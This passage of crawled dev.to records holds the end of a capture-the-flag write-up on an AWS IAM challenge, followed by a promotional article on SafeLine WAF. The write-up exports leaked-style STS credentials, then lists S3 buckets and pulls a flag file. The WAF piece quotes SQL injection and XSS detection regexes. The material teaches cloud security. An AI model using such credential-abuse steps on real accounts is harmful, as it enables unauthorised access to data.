oGZXIvYXdzEA0aDJQmv03JEKnQKp8OwCKiAk5V5ehu5IvKBGyZTVERUCaEwt8iHA7bTp2RYKfl0JNwJCxVA0bNDccjD1skSmwmfwb2H67nrKnOsj8zHrJuVXZf32XPfMni+k9tZZaw/i+18JYaZiFA/5ytPcTVg0aVQN9EpcOOvKBrWGytoya0AA3ynJTgDHAGWSljN+oIjoJQa4/ProQFye5e1Kfs6Ueh2Q31KWtBb5U4sEUlUZGTmNdoM4Zy2L9WUNjNzbpBoi2U9NhTWzORFcVRO2Y3d9p+FoqzAZIlKSyaN5cY0RTkNZYizpHgehgdrRPphU/mVjHlPhWkOn8MjT44ajwS8SJ7Tn9KqnMzBkuXa54vpm4EptngDuTVt5Z50QVZ72qCxRkz38jeTfGOe4zRPXCRXfM9oUkeKOT8/MAGMpYBjbShpAGWcCSp4q6/iJEZRRXcYOD71POGmAR1FTZkUnofAYIc/Yl4/ptWnJK1uc9nfJnUUd49yR1oSsrZGb+HtH5o1ZCql6iT7OPiYogeAbX97tbqq4nxM0qQ679+m61vpmQWvFgm//JHfN8iOGLPAZtB19zE2BzBl+sV20oedFd47J8JtbN4e1FJUGQSiYO5YiolhHuP\"\n,\n\"Expiration\"\n:\n\"2025-05-10T12:54:12+00:00\"\n}\n,\n\"SubjectFromWebIdentityToken\"\n:\n\"us-east-1:157d6171-eea6-c0da-14bd-11c12678c1a8\"\n,\n\"AssumedRoleUser\"\n:\n{\n\"AssumedRoleId\"\n:\n\"AROARK7LBOHXASFTNOIZG:HelloThere\"\n,\n\"Arn\"\n:\n\"arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/HelloThere\"\n}\n,\n\"Provider\"\n:\n\"cognito-identity.amazonaws.com\"\n,\n\"Audience\"\n:\n\"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b\"\n}\n$\nexport\nAWS_ACCESS_KEY_ID\n=\nASIARK7LBOHXPDT2U3BW\n$\nexport\nAWS_SECRET_ACCESS_KEY\n=\nCiOKsQIiMBxy3Hav5bQ230c13pycH6vrqmcVp14s\n$\nexport\nAWS_SESSION_TOKEN\n=\nFwoGZXIvYXdzEA0aDJQmv03JEKnQKp8OwCKiAk5V5ehu5IvKBGyZTVERUCaEwt8iHA7bTp2RYKfl0JNwJCxVA0bNDccjD1skSmwmfwb2H67nrKnOsj8zHrJuVXZf32XPfMni+k9tZZaw/i+18JYaZiFA/5ytPcTVg0aVQN9EpcOOvKBrWGytoya0AA3ynJTgDHAGWSljN+oIjoJQa4/ProQFye5e1Kfs6Ueh2Q31KWtBb5U4sEUlUZGTmNdoM4Zy2L9WUNjNzbpBoi2U9NhTWzORFcVRO2Y3d9p+FoqzAZIlKSyaN5cY0RTkNZYizpHgehgdrRPphU/mVjHlPhWkOn8MjT44ajwS8SJ7Tn9KqnMzBkuXa54vpm4EptngDuTVt5Z50QVZ72qCxRkz38jeTfGOe4zRPXCRXfM9oUkeKOT8/MAGMpYBjbShpAGWcCSp4q6/iJEZRRXcYOD71POGmAR1FTZkUnofAYIc/Yl4/ptWnJK1uc9nfJnUUd49yR1oSsrZGb+HtH5o1ZCql6iT7OPiYogeAbX97tbqq4nxM0qQ679+m61vpmQWvFgm//JHfN8iOGLPAZtB19zE2BzBl+sV20oedFd47J8JtbN4e1FJUGQSiYO5YiolhHuP\n$\naws sts get-caller-identity\n{\n\"UserId\"\n:\n\"AROARK7LBOHXASFTNOIZG:HelloThere\"\n,\n\"Account\"\n:\n\"092297851374\"\n,\n\"Arn\"\n:\n\"arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/HelloThere\"\n}\n$\naws s3\nls\n2024-06-06 08:21:35 challenge-website-storage-1fa5073\n2024-06-06 10:25:59 payments-system-cd6e4ba\n2023-06-04 19:07:29 tbic-wiz-analytics-bucket-b44867f\n2023-06-05 15:07:44 thebigiamchallenge-admin-storage-abf1321\n2023-06-04 18:31:02 thebigiamchallenge-storage-9979f4b\n2023-06-05 15:28:31 wiz-privatefiles\n2023-06-05 15:28:31 wiz-privatefiles-x1000\n$\naws s3\nls\ns3://wiz-privatefiles-x1000\n2023-06-05 21:42:27       4220 cognito2.png\n2023-06-05 15:28:35         40 flag2.txt\n$\naws s3\ncp\ns3://wiz-privatefiles-x1000/flag2.txt - |\ncat\n{\nwiz:open-sesame-or-shell-i-say-openid\n}\nEnter fullscreen mode\nExit fullscreen mode\nAnd this is it. The final challenge is done. Congratulations!\nPost Mortem\nI had a great time solving these challenges (unless I didn’t). They were fun, but at the same time complex and deceptive..\nTruth be told, some scenarios I was able to solve only with the help of guides from the internet. Only while writing this article did I realize that the image in challenge #5 was actually a clue and not a random picture. Because of this oversight, I had no idea where to look for the Identity Pool ID, so I had to google for a clue. Turns out it was right there all the time -- I just wasn’t bright enough to connect the dots.\nBut fun aside, all of these challenges represent possible ways an attacker can extract helpful tips, even from the most innocent pieces of information -- like IAM policies. For example, leaving\n*\nin the\nPrincipal\nfield allows any actor to subscribe to our queue. And I mean\nany\n-- including unintended actors.\nAnother interesting example of possible loopholes is limiting allowed actions to only\ns3:GetObject\nfor all actors. It sounds quite safe, right? How can you get a file you don’t know the name or location of? Turns out, there are ways, thanks to the HTTP endpoints and the\n?prefix=\nparameter.\nAnd my favorite example of how a malicious actor can follow the breadcrumbs is the leftover of a single ID -- and how it can lead to a full-scale breach of a secured perimeter, compromising sensitive data.\nLearning best practices for keeping your AWS infrastructure secure in theory is one thing. Actually seeing how even the tiniest misconfigurations can lead to a disaster -- that’s totally another. And I love it.\nFinally, to address the elephant in the room, let’s wrap this article with the most important statements regarding AWS IAM policies:\nAlways specify access to certain actions for specific resources and dedicated principals: never leave wildcard permissions anywhere.\nSeparate the open perimeter and closed perimeter of your infrastructure, and restrict access only to assigned individuals.\nCreate alerts to notify you when a user from a certain group is trying to perform an unusual action -- and is trying it repeatedly.\nPrioritize temporary credentials assignment instead of perpetual access keys. Access keys should only be used by automated workflows (though even this is a bad practice) and should be rotated regularly. Luckily, automation doesn’t complain if you’re asking it to change the password every month.\nStay secure.\nThe biggest challenge turned out to be hand-drawing the title picture on a tiny iphone screen.\n↩", "source": "devto", "crawled_at": "2025-11-27T18:24:30.730018", "metadata": {"tags": ["aws", "ctf", "iam"], "published": "2025-05-10T16:52:29Z", "author": "hatedabamboo"}}
{"url": "https://dev.to/arina_cholee/how-safeline-waf-helped-us-stop-attacks-traditional-wafs-missed-134l", "title": "How SafeLine WAF Helped Us Stop Attacks Traditional WAFs Missed", "content": "When our team first started handling higher traffic volumes, we relied on a\ntraditional WAF powered by ModSecurity\n— like most WAFs in the market. At first, it seemed to work fine, but very quickly we ran into issues:\nSQL injections slipping through\n, even though rules like\nunion[\\w\\s]?select\nwere in place.\nXSS attacks bypassing checks\nlike\n\\balert\\s\nthrough simple encoding tricks.\nHigh false positives\nblocking real users. For example, a sentence like:\nThe union select members from each department to form a committee\nwould trigger alerts as an SQL injection.\nIt became clear:\nregex-based WAFs have limitations\n. Attackers could easily tweak inputs and bypass protections, while our real users suffered interruptions.\nEnter SafeLine WAF\nWe decided to try\nSafeLine WAF\n, and the difference was immediately noticeable. Unlike traditional WAFs, SafeLine doesn’t rely on keyword matching. Instead, it uses\nsemantic and syntax analysis\nto understand the meaning behind traffic.\nHow It Works in Real Life\nTake a SQL injection attempt as an example:\nTraffic Parsing:\nSafeLine identifies positions with user inputs.\nRecursive Decoding:\nParameters are deeply decoded to reveal the original input.\nSyntax Validation:\nInputs are checked against SQL syntax rules — not just keywords.\nIntent Analysis:\nThe WAF evaluates whether the SQL statement is malicious.\nScoring & Blocking:\nOnly confirmed malicious requests are blocked, reducing false positives.\nWith this approach, simple evasion techniques that bypassed our old WAF are now detected automatically.\nThe Benefits We Saw\nFewer false positives:\nLegitimate users no longer got blocked by generic regex rules.\nBetter bot protection:\nSafeLine stopped automated scrapers from abusing our product listings.\nComprehensive security:\nCC attacks, replay attacks, and authentication threats are all covered.\nOpen source & transparent:\nWe can test, verify, and even contribute improvements.\nOne memorable moment: a bot was scraping our catalog at a high rate. SafeLine detected and mitigated it in real time, preventing potential data leaks.\nWhy Semantic Analysis Matters\nMost web programming languages —\nSQL, HTML, JavaScript\n— are\nType 2 grammars\n. Regex (Type 3) can’t fully interpret them. SafeLine leverages this understanding to go beyond keyword matching and detect\nintent\n, not just syntax. That’s why attacks that bypass traditional WAFs fail against SafeLine.\nIf you’re running a web application and care about\nsecurity without disrupting real users\n, SafeLine WAF is a game-changer. Its combination of\nsemantic analysis, bot protection, CC mitigation, and authentication tools\ngives your team visibility and control that traditional WAFs simply can’t match.\nOfficial Website:\nSafeLine WAF\nLive Demo:\nTry It Yourself", "source": "devto", "crawled_at": "2025-11-27T18:25:05.410298", "metadata": {"tags": ["websecurity", "cybersecurity", "waf", "safeline"], "published": "2025-11-27T08:36:53Z", "author": "arina_cholee"}}
